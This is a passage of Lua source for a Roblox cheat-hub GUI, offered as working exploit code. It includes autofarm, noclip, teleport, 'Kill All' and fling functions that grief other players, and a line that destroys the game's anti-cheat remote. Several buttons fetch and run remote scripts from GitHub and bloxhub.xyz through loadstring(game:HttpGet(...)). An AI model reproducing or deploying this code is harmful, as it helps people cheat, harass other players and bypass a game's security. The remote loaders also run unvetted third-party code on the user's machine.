				if checks[i].Name == "LockHolePart1" or checks[i].Name == "LockHolePart2" then
					checks[i].Transparency = 0
					if game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = checks[i].CFrame
					end
					wait(0.42)
				end
			end

			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.GoldenChest.Collider.CFrame
			repeat
				if game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
					game.Players.LocalPlayer.Character.Humanoid.Jump = true
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.GoldenChest.Collider.CFrame
				end
				wait()
			until not game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
			running = false
			wait()
		end
	end)
	local b = w:Button("Autofarm Treasure (Once)", function()
		print("Autofarm Treasure Activated (Once)")
		spawn(function()
			game:getService("RunService"):BindToRenderStep("NoClip",0,function()
				pcall(function()
					if not game.Players.LocalPlayer.Character:findFirstChildOfClass("Humanoid") then return end
					if not running == true then return end
					game.Players.LocalPlayer.Character:findFirstChildOfClass("Humanoid"):ChangeState(11)
				end)
			end)
		end)

		local checks = workspace.BoatTerrains:getDescendants()
		for i=1,#checks do
			running = true
			if checks[i].Name == "LockHolePart1" or checks[i].Name == "LockHolePart2" then
				checks[i].Transparency = 0
				if game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = checks[i].CFrame
				end
				wait(0.42)
			end
		end

		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.GoldenChest.Collider.CFrame
		repeat
			if game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.GoldenChest.Collider.CFrame
			end
			wait()
		until not game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
		running = false
	end)
	w:Section('Open Chests')
	local IBFS = workspace:WaitForChild("ItemBoughtFromShop", 1)
	w:Dropdown("Chest Type", {
		list = {
			"Common Chest",
			"Uncommon Chest",
			"Rare Chest",
			"Epic Chest",
			"Legendary Chest"
		},
		location = shared,
		flag = "chesttype"
	})
	w:Button("Open Chest", function()
		IBFS:FireServer(shared.chesttype or "Common Chest")
		print("Chest Successfully Opened")
	end)
	local qm = workspace:WaitForChild("QuestMakerEvent", 1)
	if qm then
		w:Section("Open Quests")
		w:Dropdown("Quest Name", {
			list = {
				"Cloud Quest",
				"Target Quest",
				"Ramp Quest",
				"Find Me Quest",
				"Dragon Quest",
				"The Box Quest",
				"Rings Quest",
				"Soccor Quest"
			},
			location = shared,
			flag = "questtype"
		})
		w:Button("Open Quest", function()
			qm:FireServer(({
				["Cloud Quest"] = 1,
				["Target Quest"] = 2,
				["Ramp Quest"] = 3,
				["Find Me Quest"] = 4,
				["Dragon Quest"] = 5,
				["The Box Quest"] = 6,
				["Rings Quest"] = 7,
				["Soccor Quest"] = 8
			})[shared.questtype or "Cloud Quest"])
			print("Quest Successfully Made")
		end)
	end
	w:Section("Codes")
	local b = w:Button("Redeem Codes", function()
		RedeemCode = game:GetService("Workspace").CheckCodeFunction
		RedeemCode:InvokeServer("=D")
		RedeemCode:InvokeServer("=p")
		RedeemCode:InvokeServer("hi")
		RedeemCode:InvokeServer("squid army")
		RedeemCode:InvokeServer("chillthrill709 was here")
		RedeemCode:InvokeServer("TTTRRREEEAAASSSUUURRREEE")
		print("Codes Activated")
	end)
	local b = w:Button("Share Codes", function()
		print("This Can Take Up To 15 Seconds")
		SMR = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
		SMR:FireServer("Here Are Some Codes For All Of You!", "All")
		SMR:FireServer("Currently There Are 6 Codes.", "All")
		wait(2.5)
		SMR:FireServer("Code1: =D", "All")
		wait(2.5)
		SMR:FireServer("Code2: =p", "All")
		wait(2.5)
		SMR:FireServer("Code3: hi", "All")
		wait(2.5)
		SMR:FireServer("Code4: squid army", "All")
		wait(2.5)
		SMR:FireServer("Code5: chillthrill709 was here", "All")
		wait(2.5)
		SMR:FireServer("Code6: TTTRRREEEAAASSSUUURRREEE", "All")
		print("Codes Shared")
	end)
	local w = ui:CreateWindow('Character Cheats')
	local b = w:Button("Water Godmode", function()
		LocalPlayerName = game:GetService("Players").LocalPlayer.Name
		LocalPlayerWorkspace = game:GetService("Workspace")[LocalPlayerName]
		LocalPlayerWorkspace.WaterDetector:Destroy()
		print("Water Godmode Enabled")
	end)
	local b = w:Button("Noclip (n)", function()
		noclip = false
		game:GetService('RunService').Stepped:connect(function()
			if noclip then
				game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
			end
		end)
	end)
	plr = game.Players.LocalPlayer
	mouse = plr:GetMouse()
	mouse.KeyDown:connect(function(key)

		if key == "n" then
			noclip = not noclip
			game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
		end
	end)
	print("Noclip Loaded! Press 'n' To Toggle On/Off")
	local box = w:Box('WalkSpeed', {
		flag = "ws";
		type = 'number';
	}, function(box, new, old, enter)
		print(new, old, enter)
		LocalPlayer.Character.Humanoid.WalkSpeed = tonumber(new)
		print("WalkSpeed Changed")
	end)
	local b2 = w:Button('Reset WalkSpeed', function()
		LocalPlayer.Character.Humanoid.WalkSpeed = 16
		print("WalkSpeed Reset")
	end)
	local box = w:Box('JumpPower', {
		flag = "jp";
		type = 'number';
	}, function(box, new, old, enter)
		print(new, old, enter)
		LocalPlayer.Character.Humanoid.JumpPower = tonumber(new)
		print("JumpPower Changed")
	end)
	local b2 = w:Button('Reset JumpPower', function()
		LocalPlayer.Character.Humanoid.JumpPower = 50
		print("JumpPower Reset")
	end)
	local box = w:Box('HipHeight', {
		flag = "hh";
		type = 'number';
	}, function(box, new, old, enter)
		print(new, old, enter)
		LocalPlayer.Character.Humanoid.HipHeight = tonumber(new)
		print("HipHeight Changed")
	end)
	local b2 = w:Button('Reset HipHeight', function()
		LocalPlayer.Character.Humanoid.HipHeight = 2
		print("HipHeight Reset")
	end)
	local s = w:Slider("Gravity", {
		min = 0;
		max = 196.2;
		flag = 'g'
	}, function(v)
		game:GetService("Workspace").Gravity = v;
	end)
	local b2 = w:Button('Reset Gravity', function()
		game:GetService("Workspace").Gravity = 196.2
		print("Gravity Reset")
	end)
	local old = workspace.CurrentCamera.FieldOfView
	local s = w:Slider("FOV", {
		min = math.floor(workspace.CurrentCamera.FieldOfView);
		max = 120;
		flag = 'fov'
	}, function(v)
		workspace.CurrentCamera.FieldOfView = v;
	end)
	local b2 = w:Button('Reset FOV', function()
		s:Set(old)
		print("Reset")
	end)
	w:Section('Kill Yourself')
	w:Bind("Kill Player", {
		flag = "killbind";
		kbonly = true;
		default = Enum.KeyCode.RightAlt;
	}, function()
		game.Players.LocalPlayer.Character:BreakJoints()
		print("Killed Yourslef")
	end)
	w:Section('Characters')
	local b = w:Button("Fox Character", function()
		CC = game:GetService("Workspace").ChangeCharacter
		CC:FireServer("FoxCharacter")
		print("Successfully Changed To Fox Character")
	end)
	local b = w:Button("Chicken Character", function()
		CC = game:GetService("Workspace").ChangeCharacter
		CC:FireServer("ChickenCharacter")
		print("Successfully Changed To Chicken Character")
	end)
	local b = w:Button("Penguin Character", function()
		CC = game:GetService("Workspace").ChangeCharacter
		CC:FireServer("PenguinCharacter")
		print("Successfully Changed To Penguin Character")
	end)
	local w = ui:CreateWindow('Teleports')
	local b = w:Button("Teleport Random Player", function()
		local randomPlayer = game.Players:GetPlayers()
		[math.random(1,#game.Players:GetPlayers())]
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(randomPlayer.Character.Head.Position.X, randomPlayer.Character.Head.Position.Y, randomPlayer.Character.Head.Position.Z))
		print("Teleported To ???")
	end)
	local box = w:Box('Player', {
		flag = "p";
		type = 'string';
	}, function(box, new, old, enter)
		print(new, old, enter)
		_G.PlayerSelected = new
	end)
	local b2 = w:Button('Teleport', function()
		PlayerName = game:GetService("Players")[_G.PlayerSelected]
		LocalPlayer.Character.HumanoidRootPart.CFrame = PlayerName.Character.HumanoidRootPart.CFrame
		print("Teleported To Player")
	end)
	local b = w:Button("Teleport Tool", function()
		local plr = game:GetService("Players").LocalPlayer
		local mouse = plr:GetMouse()

		local tool = Instance.new("Tool")
		tool.RequiresHandle = false
		tool.Name = "Teleport Tool"

		tool.Activated:Connect(function()
			local root = plr.Character.HumanoidRootPart
			local pos = mouse.Hit.Position+Vector3.new(0,2.5,0)
			local offset = pos-root.Position
			root.CFrame = root.CFrame+offset
		end)

		tool.Parent = plr.Backpack
		print("Tool Received")
	end)
	w:Section('Team Teleports')
	local b = w:Button("BlackZone", function()
		LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-328.943665, -9.89999294, -72.1218643, -0.000303131208, -3.68797224e-08, 0.99999994, 3.53605003e-08, 1, 3.68904445e-08, -0.99999994, 3.53716807e-08, -0.000303131208)
		print("Teleported To BlackZone")
	end)
	local b = w:Button("Really blueZone", function()
		LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(221.835587, -9.89999294, 289.496735, 3.00895917e-05, 1.89661886e-08, -1, -1.8994708e-08, 1, 1.89656184e-08, 1, 1.89941378e-08, 3.00895917e-05)
		print("Teleported To Really blueZone")
	end)
	local b = w:Button("CamoZone", function()
		LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-328.966553, -9.89999294, 285.890778, 2.32723869e-05, 4.81436508e-08, 1, -8.0430631e-08, 1, -4.81417786e-08, -1, -8.04295084e-08, 2.32723869e-05)
		print("Teleported To CamoZone")
	end)
	local b = w:Button("MagentaZone", function()
		LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(221.835083, -9.89999294, 647.695251, -2.21245518e-05, -1.27197168e-08, -1, -7.80432288e-08, 1, -1.27179902e-08, 1, 7.80429446e-08, -2.21245518e-05)
		print("Teleported To MagentaZone")
	end)
	local b = w:Button("Really redZone", function()
		LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(221.835068, -9.89999294, -68.7047195, -2.20595903e-05, -1.15739818e-08, -1, -8.31205469e-08, 1, -1.15721486e-08, 1, 8.31202911e-08, -2.20595903e-05)
		print("Teleported To Really redZone")
	end)
	local b = w:Button("WhiteZone", function()
		LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-53.5637512, -9.89999294, -345.507538, 1, 4.29280682e-08, -2.15271102e-05, -4.29279226e-08, 1, 6.71854927e-09, 2.15271102e-05, -6.71762512e-09, 1)
		print("Teleported To WhiteZone")
	end)
	local b = w:Button("New YellerZone", function()
		LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-328.942108, -9.89999294, 643.876709, -0.00115210481, -5.0259036e-08, 0.999999344, 4.44386856e-08, 1, 5.03102662e-08, -0.999999344, 4.44966162e-08, -0.00115210481)
		print("Teleported To New YellerZone")
	end)
	w:Section('TheEnd')
	local b = w:Button("WaterSand", function()
		LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-53.5905228, -360.700012, 9499.88184, 0.99999994, 5.23848342e-09, 0.000277680316, -5.23909627e-09, 1, 2.20502683e-09, -0.000277680316, -2.20648144e-09, 0.99999994)
		print("Teleported To WaterSand")
	end)
	local w = ui:CreateWindow('Miscellaneous')
	w:Section('New')
	local b = w:Button("Kill All", function()
		print("[WARNING] Only Works If Players Have Pvp Mode Enabled")
		LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-53.5655861, -360.700012, 9391.29199, 0.999978304, 8.00575783e-09, -0.00659008743, -8.00250088e-09, 1, 5.20489041e-10, 0.00659008743, -4.67740568e-10, 0.999978304)
		print("Successfully Teleported Players")
		game:GetService("RunService").Stepped:connect(function()
			for i,v in pairs (game:GetService("Players"):GetChildren()) do
				if v.TeamColor ~= LocalPlayer.TeamColor and v.Name ~= LocalPlayer.Name then
					v.Character.HumanoidRootPart.Anchored = true
					v.Character.HumanoidRootPart.CFrame = CFrame.new(-53.5905228, -360.700012, 9499.88184, 0.99999994, 5.23848342e-09, 0.000277680316, -5.23909627e-09, 1, 2.20502683e-09, -0.000277680316, -2.20648144e-09, 0.99999994)
				end
			end
		end)
	end)
	local b = w:Button("Big Head Player", function()
		LocalPlayerName = game:GetService("Players").LocalPlayer.Name
		LocalPlayerWorkspace = game:GetService("Workspace")[LocalPlayerName]
		LocalPlayerWorkspace.Head.Size = Vector3.new(4, 2, 2)
		print("Head Enlarged")
	end)
	w:Section('Launch Teams')
	local b = w:Button("Launch BlackZone", function()
		game:GetService("Workspace").BlackZone.RE:FireServer()
		print("Launched BlackZone")
	end)
	local b = w:Button("Launch Really blueZone", function()
		game:GetService("Workspace")["Really blueZone"].RE:FireServer()
		print("Launched Really blueZone")
	end)
	local b = w:Button("Launch CamoZone", function()
		game:GetService("Workspace").CamoZone.RE:FireServer()
		print("Launched CamoZone")
	end)
	local b = w:Button("Launch MagentaZone", function()
		game:GetService("Workspace")["MagentaZone"].RE:FireServer()
		print("Launched MagentaZone")
	end)
	local b = w:Button("Launch Really redZone", function()
		game:GetService("Workspace")["Really redZone"].RE:FireServer()
		print("Launched Really redZone")
	end)
	local b = w:Button("Launch WhiteZone", function()
		game:GetService("Workspace")["WhiteZone"].RE:FireServer()
		print("Launched WhiteZone")
	end)
	local b = w:Button("Launch New YellerZone", function()
		game:GetService("Workspace")["New YellerZone"].RE:FireServer()
		print("Launched New YellerZone")
	end)
	local w = ui:CreateWindow('Fun')
	w:Section('Flings')
	local b = w:Button("Spin Fling (R6)", function()
		power = 500 -- change this to make it more or less powerful

		game:GetService('RunService').Stepped:connect(function()
			game.Players.LocalPlayer.Character.Head.CanCollide = false
			game.Players.LocalPlayer.Character.Torso.CanCollide = false
			game.Players.LocalPlayer.Character["Left Leg"].CanCollide = false
			game.Players.LocalPlayer.Character["Right Leg"].CanCollide = false
		end)

		wait(.1)
		local bambam = Instance.new("BodyThrust")
		bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
		bambam.Force = Vector3.new(power,0,power)
		bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
		print("Spin Fling (R6) Enabled")
	end)
	local b = w:Button("Spin Fling (R15)", function()
		power = 500 -- change this to make it more or less powerful

		game:GetService('RunService').Stepped:connect(function()
			game.Players.LocalPlayer.Character.Head.CanCollide = false
			game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
			game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
			game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
		end)
		wait(.1)
		local bambam = Instance.new("BodyThrust")
		bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
		bambam.Force = Vector3.new(power,0,power)
		bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
		print("Spin Fling (R15) Enabled")
	end)
	local b = w:Button("Invisible Fling", function()



		spawn(function()
			local message = Instance.new("Message",workspace)
			message.Text = "Loaded Press 'z' To Execute Invisibility , Press 'x' To Respawn)"
			wait(0.5)
			message:Destroy()
		end)








		local mouse = game.Players.LocalPlayer:GetMouse()

		local groot = nil

		mouse.KeyDown:connect(function(k)

			if k == "z" then



				spawn(function()
					local message = Instance.new("Message",workspace)
					message.Text = "Fe Invisible Fling By Loaded (Wait 11 Seconds To Load)"
					wait(11)
					message:Destroy()
				end)


				local ch = game.Players.LocalPlayer.Character
				local prt=Instance.new("Model", workspace)
				local z1 =  Instance.new("Part", prt)
				z1.Name="Torso"
				z1.CanCollide = false
				z1.Anchored = true
				local z2  =Instance.new("Part", prt)
				z2.Name="Head"
				z2.Anchored = true
				z2.CanCollide = false
				local z3 =Instance.new("Humanoid", prt)
				z3.Name="Humanoid"
				z1.Position = Vector3.new(0,9999,0)
				z2.Position = Vector3.new(0,9991,0)
				game.Players.LocalPlayer.Character=prt
				wait(5)
				game.Players.LocalPlayer.Character=ch
				wait(6)


				local plr = game.Players.LocalPlayer
				mouse = plr:GetMouse()

				local Hum = Instance.new("Humanoid")
				Hum.Parent = game.Players.LocalPlayer.Character


				local root =  game.Players.LocalPlayer.Character.HumanoidRootPart


				for i,v in pairs(plr.Character:GetChildren()) do

					if v ~= root and  v.Name ~= "Humanoid" then

						v:Destroy()

					end


				end

				workspace.CurrentCamera.CameraSubject = root

				local se = Instance.new("SelectionBox",root)
				se.Adornee = root


				game:GetService('RunService').Stepped:connect(function()
					game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
				end)
				game:GetService('RunService').RenderStepped:connect(function()
					game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
				end)


				power = 999999 -- change this to make it more or less powerful

				power = power*10

				---
				wait(.1)
				local bambam = Instance.new("BodyThrust")
				bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
				bambam.Force = Vector3.new(power,0,power)
				bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position 





				local plr = game.Players.LocalPlayer
				local torso = root
				local flying = true
				local deb = true
				local ctrl = {f = 0, b = 0, l = 0, r = 0}
				local lastctrl = {f = 0, b = 0, l = 0, r = 0}
				local maxspeed = 120
				local speed = 15


				---local bambam = Instance.new("BodyThrust")
				---bambam.Parent = torso
				--bambam.Force = Vector3.new(9999999,0,9999999)
				--bambam.Location = torso.Position


				---
				groot = root

				function Fly()
					local bg = Instance.new("BodyGyro", torso)
					bg.P = 9e4
					bg.maxTorque = Vector3.new(0, 0, 0)
					bg.cframe = torso.CFrame
					local bv = Instance.new("BodyVelocity", torso)
					bv.velocity = Vector3.new(0,0,0)
					bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
					repeat wait()

						if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
							speed = speed+.2
							if speed > maxspeed then
								speed = maxspeed
							end
						elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
							speed = speed-1
							if speed < 0 then
								speed = 0
							end
						end
						if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
							bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
							lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
						elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
							bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
						else
							bv.velocity = Vector3.new(0,0.1,0)
						end

					until not flying
					ctrl = {f = 0, b = 0, l = 0, r = 0}
					lastctrl = {f = 0, b = 0, l = 0, r = 0}
					speed = 0
					bg:Destroy()
					bv:Destroy()

				end
				mouse.KeyDown:connect(function(key)
					if key:lower() == "e" then
						if flying then flying = false
						else
							flying = true
							Fly()
						end
					elseif key:lower() == "w" then
						ctrl.f = 1
					elseif key:lower() == "s" then
						ctrl.b = -1
					elseif key:lower() == "a" then
						ctrl.l = -1
					elseif key:lower() == "d" then
						ctrl.r = 1
					end
				end)
				mouse.KeyUp:connect(function(key)
					if key:lower() == "w" then
						ctrl.f = 0
					elseif key:lower() == "s" then
						ctrl.b = 0
					elseif key:lower() == "a" then
						ctrl.l = 0
					elseif key:lower() == "d" then
						ctrl.r = 0
					elseif key:lower() == "r" then

					end
				end)
				Fly()



			elseif k == "x" then


				spawn(function()
					local message = Instance.new("Message",workspace)
					message.Text = "Respawning Don't Spam"
					wait(1)
					message:Destroy()
				end)

				local saved = groot.Position

				local ch = game.Players.LocalPlayer.Character
				local prt=Instance.new("Model", workspace)
				local z1 =  Instance.new("Part", prt)
				z1.Name="Torso"
				z1.CanCollide = false
				z1.Anchored = true
				local z2  =Instance.new("Part", prt)
				z2.Name="Head"
				z2.Anchored = true
				z2.CanCollide = false
				local z3 =Instance.new("Humanoid", prt)
				z3.Name="Humanoid"
				z1.Position = Vector3.new(0,9999,0)
				z2.Position = Vector3.new(0,9991,0)
				game.Players.LocalPlayer.Character=prt
				wait(5)
				game.Players.LocalPlayer.Character=ch
				local poop = nil
				repeat wait() poop = game.Players.LocalPlayer.Character:FindFirstChild("Head") until poop ~= nil
				wait(1)
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(saved)
				print("Invisible Fling Enabled")

			end


		end)
	end)
	w:Section('Fly')
	w:Button("Fly (f)", function()
		repeat wait()
		until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("UpperTorso") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid")
		local mouse = game.Players.LocalPlayer:GetMouse()
		repeat wait() until mouse
		local plr = game.Players.LocalPlayer
		local UpperTorso = plr.Character.UpperTorso
		local flying = true
		local deb = true
		local ctrl = {f = 0, b = 0, l = 0, r = 0}
		local lastctrl = {f = 0, b = 0, l = 0, r = 0}
		local maxspeed = 100
		local speed = 1

		function Fly()
			plr.Character.Humanoid.WalkSpeed = 16.5
			plr.Character.Humanoid.JumpPower = 50.5
			local bg = Instance.new("BodyGyro", UpperTorso)
			bg.P = 9e4
			bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
			bg.cframe = UpperTorso.CFrame
			local bv = Instance.new("BodyVelocity", UpperTorso)
			bv.velocity = Vector3.new(0,0.1,0)
			bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
			repeat wait()
				plr.Character.Humanoid.PlatformStand = true
				if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
					speed = speed+.5+(speed/maxspeed)
					if speed > maxspeed then
						speed = maxspeed
					end
				elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
					speed = speed-1
					if speed < 0 then
						speed = 0
					end
				end
				if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
					bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
					lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
				elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
					bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
				else
					bv.velocity = Vector3.new(0,0.1,0)
				end
				bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
			until not flying
			ctrl = {f = 0, b = 0, l = 0, r = 0}
			lastctrl = {f = 0, b = 0, l = 0, r = 0}
			speed = 0
			bg:Destroy()
			bv:Destroy()
			plr.Character.Humanoid.PlatformStand = false
		end
		mouse.KeyDown:connect(function(key)
			if key:lower() == "f" then
				if flying then flying = false
				else
					flying = true
					Fly()
				end
			elseif key:lower() == "w" then
				ctrl.f = 1
			elseif key:lower() == "s" then
				ctrl.b = -1
			elseif key:lower() == "a" then
				ctrl.l = -1
			elseif key:lower() == "d" then
				ctrl.r = 1
			end
		end)
		mouse.KeyUp:connect(function(key)
			if key:lower() == "w" then
				ctrl.f = 0
			elseif key:lower() == "s" then
				ctrl.b = 0
			elseif key:lower() == "a" then
				ctrl.l = 0
			elseif key:lower() == "d" then
				ctrl.r = 0
			end
		end)
		Fly()
		print("Fly Enabled")
	end)
	local b = w:Button("Destroy Gui", function()
		game:GetService("CoreGui").ScreenGui:Destroy()
		print("Gui Destroyed")
	end)
	game:GetService("Workspace").ExploitCheckRemote:Destroy()
	print("AntiCheat Deactivated")
	print("Gui Loaded")
end)
UICorner_10.Parent = BABFT

Arsenal.Name = "Arsenal"
Arsenal.Parent = Scripts
Arsenal.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Arsenal.Position = UDim2.new(0.282868534, 0, -0.00145356986, 0)
Arsenal.Size = UDim2.new(0, 71, 0, 50)
Arsenal.Font = Enum.Font.SciFi
Arsenal.Text = "Arsenal"
Arsenal.TextColor3 = Color3.fromRGB(0, 0, 0)
Arsenal.TextSize = 21.000
Arsenal.TextWrapped = true
Arsenal.MouseButton1Click:connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/SiLeNSwOrD/OwlHub/master/OwlHub.txt"))()
end)
UICorner_11.Parent = Arsenal

SpeedRun4.Name = "SpeedRun4"
SpeedRun4.Parent = Scripts
SpeedRun4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SpeedRun4.Position = UDim2.new(0.565737069, 0, 0.0822313726, 0)
SpeedRun4.Size = UDim2.new(0, 71, 0, 50)
SpeedRun4.Font = Enum.Font.SciFi
SpeedRun4.Text = "Speed Run 4"
SpeedRun4.TextColor3 = Color3.fromRGB(0, 0, 0)
SpeedRun4.TextScaled = true
SpeedRun4.TextSize = 14.000
SpeedRun4.TextWrapped = true
SpeedRun4.MouseButton1Click:connect(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Scripts/master/Speed%20Run%204", true))()
end)
UICorner_12.Parent = SpeedRun4

RoGhoul.Name = "RoGhoul"
RoGhoul.Parent = Scripts
RoGhoul.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
RoGhoul.Position = UDim2.new(0.282868534, 0, 0.124425471, 0)
RoGhoul.Size = UDim2.new(0, 71, 0, 50)
RoGhoul.Font = Enum.Font.SciFi
RoGhoul.Text = "Ro Ghoul"
RoGhoul.TextColor3 = Color3.fromRGB(0, 0, 0)
RoGhoul.TextScaled = true
RoGhoul.TextSize = 14.000
RoGhoul.TextWrapped = true
RoGhoul.MouseButton1Click:connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/z4gs/scripts/master/Ro-Ghoul%20Auto%20Farm.lua",true))()
end)

UICorner_13.Parent = RoGhoul

SAKTK.Name = "SAKTK"
SAKTK.Parent = Scripts
SAKTK.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SAKTK.Position = UDim2.new(0.565737069, 0, 0.0408811644, 0)
SAKTK.Size = UDim2.new(0, 71, 0, 50)
SAKTK.Font = Enum.Font.SciFi
SAKTK.Text = "SAKTK"
SAKTK.TextColor3 = Color3.fromRGB(0, 0, 0)
SAKTK.TextScaled = true
SAKTK.TextSize = 14.000
SAKTK.TextWrapped = true
SAKTK.MouseButton1Click:connect(function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/Ghostmode65/STK-Bo2/master/STK-Menus/v5/STKv5.txt'))()
end)

UICorner_14.Parent = SAKTK

AdoptMe.Name = "AdoptMe"
AdoptMe.Parent = Scripts
AdoptMe.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AdoptMe.Position = UDim2.new(0.282868534, 0, 0.0830752552, 0)
AdoptMe.Size = UDim2.new(0, 71, 0, 50)
AdoptMe.Font = Enum.Font.SciFi
AdoptMe.Text = "Adopt Me"
AdoptMe.TextColor3 = Color3.fromRGB(0, 0, 0)
AdoptMe.TextScaled = true
AdoptMe.TextSize = 14.000
AdoptMe.TextWrapped = true
AdoptMe.MouseButton1Click:connect(function()
	_G.SubToBloxiScripts = false
	loadstring(game:HttpGet("https://bloxhub.xyz/script/loader"))()
end)

UICorner_15.Parent = AdoptMe

NinjaLegends.Name = "NinjaLegends"
NinjaLegends.Parent = Scripts
NinjaLegends.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
NinjaLegends.Position = UDim2.new(0, 0, 0.0830752552, 0)
NinjaLegends.Size = UDim2.new(0, 71, 0, 50)
NinjaLegends.Font = Enum.Font.SciFi
NinjaLegends.Text = "Ninja Legends"
NinjaLegends.TextColor3 = Color3.fromRGB(0, 0, 0)
NinjaLegends.TextScaled = true
NinjaLegends.TextSize = 14.000
NinjaLegends.TextWrapped = true
NinjaLegends.MouseButton1Click:connect(function()
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/MarsQQ/ScriptHubScripts/master/NinjaLegends'),true))()
end)

UICorner_16.Parent = NinjaLegends

RoCitizens.Name = "RoCitizens"
RoCitizens.Parent = Scripts
RoCitizens.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
RoCitizens.Position = UDim2.new(0, 0, 0.124003537, 0)
RoCitizens.Size = UDim2.new(0, 71, 0, 50)
RoCitizens.Font = Enum.Font.SciFi
RoCitizens.Text = "Ro Citizens"
RoCitizens.TextColor3 = Color3.fromRGB(0, 0, 0)
RoCitizens.TextScaled = true
RoCitizens.TextSize = 14.000
RoCitizens.TextWrapped = true
RoCitizens.MouseButton1Click:connect(function()
	game.Players.LocalPlayer.ChangeMoney:Fire(1000000000000)
end)

UICorner_17.Parent = RoCitizens

MeepCity.Name = "MeepCity"
MeepCity.Parent = Scripts
MeepCity.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MeepCity.Position = UDim2.new(0.565737069, 0, 0.124425471, 0)
